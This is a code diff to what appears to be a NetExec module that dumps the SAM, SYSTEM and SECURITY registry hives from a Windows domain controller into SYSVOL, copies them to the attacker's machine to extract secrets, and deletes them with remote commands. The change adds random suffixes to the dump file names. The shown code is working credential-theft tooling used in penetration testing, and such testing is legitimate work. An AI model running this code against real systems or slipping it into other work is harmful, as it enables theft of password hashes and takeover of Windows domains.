@@ -5,7 +5,7 @@ from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
 from impacket.smbconnection import SessionError
 from impacket.dcerpc.v5 import transport, rrp
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
-from nxc.helpers.misc import CATEGORY
+from nxc.helpers.misc import CATEGORY, gen_random_string
 
 
 class NXCModule:
@@ -26,6 +26,8 @@ class NXCModule:
 
     def on_login(self, context, connection):
         connection.args.share = "SYSVOL"
+        rand_suffix = gen_random_string(8)
+
         # enable remote registry
         context.log.display("Triggering RemoteRegistry to start through named pipe...")
         connection.trigger_winreg()
@@ -43,7 +45,7 @@ class NXCModule:
 
             for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                 hRootKey, subKey = self._strip_root_key(dce, hive)
-                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
+                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
                 context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
                 try:
                     ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
@@ -62,7 +64,7 @@ class NXCModule:
         # copy remote file to local
         log_path = f"{connection.output_filename}."
         for hive in ["SAM", "SECURITY", "SYSTEM"]:
-            connection.get_file_single(hive, log_path + hive)
+            connection.get_file_single(f"{hive}_{rand_suffix}", log_path + hive)
 
         # read local file
         try:
@@ -97,16 +99,17 @@ class NXCModule:
                     context.log.fail(f"Fail to dump the NTDS: {e!s}")
 
                 context.log.display(f"Cleaning dump with user {self.domain_admin} and hash {self.domain_admin_hash} on domain {connection.domain}")
-                connection.execute("del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM")
+                connection.execute(f"del C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix} && del C:\\Windows\\sysvol\\sysvol\\SAM_{rand_suffix} && del C:\\Windows\\sysvol\\sysvol\\SYSTEM_{rand_suffix}")
                 sleep(0.2)
                 for hive in ["SAM", "SECURITY", "SYSTEM"]:
+                    remote_name = f"{hive}_{rand_suffix}"
                     try:
-                        out = connection.conn.listPath("SYSVOL", hive)
+                        out = connection.conn.listPath("SYSVOL", remote_name)
                         if out:
                             self.deleted_files = False
-                            context.log.fail(f"Fail to remove the file {hive}, path: C:\\Windows\\sysvol\\sysvol\\{hive}")
+                            context.log.fail(f"Fail to remove the file {remote_name}, path: C:\\Windows\\sysvol\\sysvol\\{remote_name}")
                     except SessionError as e:
-                        context.log.debug(f"File {hive} successfully removed: {e}")
+                        context.log.debug(f"File {remote_name} successfully removed: {e}")
             else:
                 self.deleted_files = False
         else:
@@ -114,7 +117,7 @@ class NXCModule:
 
         if not self.deleted_files:
             context.log.display("Use the domain admin account to clean the file on the remote host")
-            context.log.display("netexec smb dc_ip -u user -p pass -x \"del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM\"")  # noqa: Q003
+            context.log.display(f"netexec smb dc_ip -u user -p pass -x \"del C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix} && del C:\\Windows\\sysvol\\sysvol\\SAM_{rand_suffix} && del C:\\Windows\\sysvol\\sysvol\\SYSTEM_{rand_suffix}\"")  # noqa: Q003
         else:
             context.log.display("Successfully deleted dump files !")
 
